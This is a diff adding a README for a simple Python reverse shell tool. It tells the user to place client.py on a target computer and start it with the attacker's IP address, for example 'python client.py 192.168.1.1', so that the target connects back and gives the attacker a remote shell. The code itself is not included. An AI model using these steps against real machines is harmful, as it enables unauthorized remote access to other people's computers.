@@ -1,0 +1,13 @@
+This is a reverse shell in python. This isn't as good as netcat, but is in python so, yeah. 
+
+1. Put the client.py file onto the target computer
+
+2. Keep the server.py file on your computer
+
+3. Run the server.py file (in CMD or terminal depending on what OS you are using) by using the command "python server.py" (without quotes)
+
+4. Start the client.py file on the targets computer by using the command "python client.py <the ip address of the computer with the server.py script runnng (e.g python client.py 192.168.1.1)> (also without quotes)
+
+And BOOM! Reverse shell. Now, it is far from perfect but it is version 1.0, so hopefully I will make better vsersions later on.
+
+If you are getting an error with the client connecting to you, change the SERVR_PORT variable in both server.py and client.py scripts to any port above 1024 as long as they are the same. 
